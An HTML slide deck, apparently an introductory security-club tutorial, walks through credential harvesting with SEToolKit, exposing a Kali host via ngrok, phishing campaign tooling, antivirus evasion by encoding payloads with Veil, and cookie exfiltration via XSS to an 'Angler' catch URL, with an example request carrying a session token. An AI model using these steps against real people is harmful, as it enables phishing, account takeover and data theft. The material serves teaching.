                <p>This is not designed to teach you how to hack, but rather for you to understand
                how certain attacks work</p>
                <p>Don't be dumb, only do this with accounts you own</p>
                <p>Also, don't be a script kiddy; learn this stuff for real, and know much more than
                what is in these slides</p>
                <p>This is meant to be a teaser - a jumping off point so that you can learn more
                on your own</p>

				<h2>Credential Harvesting</h2>
                <p>
                Use <a href='https://github.com/trustedsec/social-engineer-toolkit'>SEToolKit</a>
                in order to steal credentials. Its relatively easy to perform a credential harvesting
                attack.
                </p>

                <h2>Steps for credential harvesting</h2>
                <ol>
                    <li>Run setoolkit (its instaled on kali linux by default), or clone it</li>
                    <li>Select social engineering attacks</li>
                    <li>Select website attack vectors</li>
                    <li>Select credential harvesting</li>
                </ol>
            </section>


            <section>
                <h2>Steps for credential harvesting Continued</h2>
                <ol start=5>
                    <li>Select web templates</li>
                    <li>Find your ip address (In a new terminal window, run ifconfig)</li>
                    <li>Select your desired website, and enter your ip address</li>
                </ol>
            </section>

            <section>
                <h2>Steps for credential harvesting Continued</h2>
                <ol start=7>
                    <li>visit your ip address and sign in with fake credentials, they will appear in
                    the SEToolKit window</li>
                </ol>
            </section>

            <section>
                <h2>Access an internal machine from the internet</h2>
                <p>Often, you will want to keep kali off the public internet, but still want to
                access it. You can use <a href='https://ngrok.com'>NGrok</a> to do this.
                </p>
                <p>Simply download it, add it to your $PATH, and run `ngrok http 80`</p>
            </section>

            <section>
                <h2>A little bit more on phishing</h2>
                <p>Phishing is much more than just that. If you spearphish, learn a lot of information
                about your target first, if you are attempting to hit a lot of targets at once, write
                a believable email, etc.</p>
            </section>

            <section>
                <h2>A little bit more on phishing</h2>
                <p>Look up the following if you want to head on the right track of a phishing campaign</p>
                <ul>
                    <li><a href='https://mailinabox.email'>MailinaBox</a></li>
                    <li><a href='https://getgophish.com'>GoPhish</a></li>
                    <li>Social Engineering</li>
                    <li>Domain Squatting</li>
                </ul>
            </section>

            <section>
                <h2>Evading AV</h2>
                <p>Often, when phishing, a malicious file instead of url will be used, but these are
                much more likely to be stopped by antivirus. For this, you will want to encode your
                payload.</p>
                <p>You can encode your binary with <a href='https://github.com/Veil-Framework/Veil'>Veil.</a></p>
            </section>

            <section>
                <h2>Angler</h2>
                <ul>
                    <li>Occasionally, when doing things, you will want to exfiltrate some data.</li>
                    <li>I like to use use url requests for doing this. <a href='https://github.com/mattlombana/angler'>Angler</a></li>
                    <li>This can be used to steal cookies when combined with Cross-Site Scripting</li>
                    <li>just send a get request to [anglerurl]/catch/[data] with data</li>
                    <li>For example: http://127.0.0.1/catch/session=exampleSession</li>
                </ul>
            </section>

            <section>
                <h2>Vulnerable Apps</h2>
                <p>If you want to practice with this, checkout <a href='https://github.com/MattLombana/Vulnerable-Apps'>Vulnerable Apps.</a> (You can use Angler to steal the admin's cookie in Cross-Country)</p>
            </section>

            <section>
                <h2>Once again</h2>
                <p>This is not designed to teach you how to hack, but rather for you to understand
                how certain attacks work</p>
                <p>Don't be dumb, only do this with accounts you own</p>
                <p>Also, don't be a script kiddy; learn this stuff for real, and know much more than
                what is in these slides</p>
                <p>This is meant to be a teaser - a jumping off point so that you can learn more
                on your own</p>
